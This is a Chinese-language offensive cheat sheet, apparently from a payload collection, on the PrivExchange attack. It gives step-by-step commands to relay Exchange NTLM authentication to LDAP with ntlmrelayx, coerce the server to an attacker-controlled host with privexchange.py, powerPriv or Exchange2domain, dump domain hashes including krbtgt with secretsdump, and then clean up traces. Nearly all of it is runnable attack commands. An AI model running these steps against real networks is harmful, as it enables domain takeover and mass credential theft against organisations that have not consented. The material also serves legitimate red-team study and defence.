# PrivExchange

通过滥用 Exchange，将你的权限交换为 Domain Admin (域管理员) 权限。
:warning: 你需要拥有一个带有邮箱的用户帐户的 shell。

1. Exchange 服务器主机名或 IP 地址

    ```bash
    pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
    ```

2. 中继 Exchange 服务器身份验证并提升权限 (使用 Impacket 中的 ntlmrelayx)。

    ```powershell
    ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
    ```

3. 订阅推送通知功能 (使用 privexchange.py 或 powerPriv)，使用当前用户的凭据向 Exchange 服务器进行身份验证。迫使 Exchange 服务器将其 NTLMv2 哈希发送回受控机器。

    ```bash
    # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
    python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
    python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
    
    # https://github.com/G0ldenGunSec/PowerPriv 
    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
    ```

4. 获利：使用 Impacket 中的 secretdumps，用户现在可以执行 dcsync 并获取另一个用户的 NTLM 哈希

    ```bash
    python secretsdump.py xxxxxxxxxx -just-dc
    python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
    ```

5. 清理痕迹并恢复用户 ACL 的先前状态

    ```powershell
    python aclpwn.py --restore ../aclpwn-20190319-125741.restore
    ```

或者，你可以使用 Metasploit 模块

[`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)

或者你可以使用一个一体化工具：Exchange2domain。

```powershell
git clone github.com/Ridter/Exchange2domain 
python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
```

## 参考资料 (References)

* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
